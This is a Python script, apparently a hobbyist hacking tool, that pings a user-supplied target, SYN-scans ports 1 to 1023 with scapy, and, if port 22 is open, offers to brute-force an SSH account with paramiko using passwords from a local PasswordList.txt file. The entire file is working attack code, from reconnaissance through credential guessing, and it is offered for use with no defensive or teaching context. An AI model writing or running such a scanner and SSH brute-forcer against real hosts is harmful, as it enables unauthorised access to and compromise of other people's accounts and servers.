#Text file named PasswordList.txt, containing possible passwords must exist in script location for SSH brute force to work


from scapy.all import *
import paramiko

Target = input("Set the Target IP to scan ==> ")
Registered_ports = range(1, 1024)
open_ports = []

def scan_port(port):
    src_port = RandShort()
    conf.verb = 0
    syn_pkt = sr1(IP(dst=Target) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5)
    if syn_pkt == None:
        return False
    else:
        if syn_pkt.haslayer(TCP) == None:
            return False
        else:
            if syn_pkt.getlayer(TCP).flags == 0x12:
                sr(IP(dst=Target) / TCP(sport=src_port, dport=port, flags="R"), timeout=2)
                return True

def host_av():
    icmp = sr1(IP(dst=Target) / ICMP(), timeout=3)
    try:
        conf.verb = 0
        if icmp != None:
            return True
        else:
            print("Target is DOWN")
            exit()
    except Exception as error:
        print("Something went wrong... The error message is: {}".format(error))
        return False

def Brute_Force(port):
    with open("PasswordList.txt", "r") as passwords:
        passwords = [i.strip() for i in passwords]
        user = input("Type login to BruteForce ==> ")
        SSHconn = paramiko.SSHClient()
        SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for password in passwords:
            try:
                SSHconn.connect(Target, port=int(port), username=user, password=password, timeout = 1)
                print("\nSuccess!! Password is ==> {}".format(password))
                SSHconn.close()
                break
            except paramiko.ssh_exception.AuthenticationException:
                print("{} failed.".format(password))


if host_av() == True:
    print("Target is UP")


for port in Registered_ports:
    status = scan_port(port)
    if status == True:
        open_ports.append(port)
        print("Port open: {}".format(port))


print("Finished scanning.")


if 22 in open_ports:
    print("Port 22 is OPEN.")
    resp = input("Do you want to try and BruteForce SSH? Type 'Y' if you do or 'N' to close script ==> ").upper()
    if resp == "Y":
        Brute_Force(22)
    elif resp == "N":
        print("OK, bye!")
    else:
        print("That wasn't the option you could choose, but it wasn't a yes so... bye!")

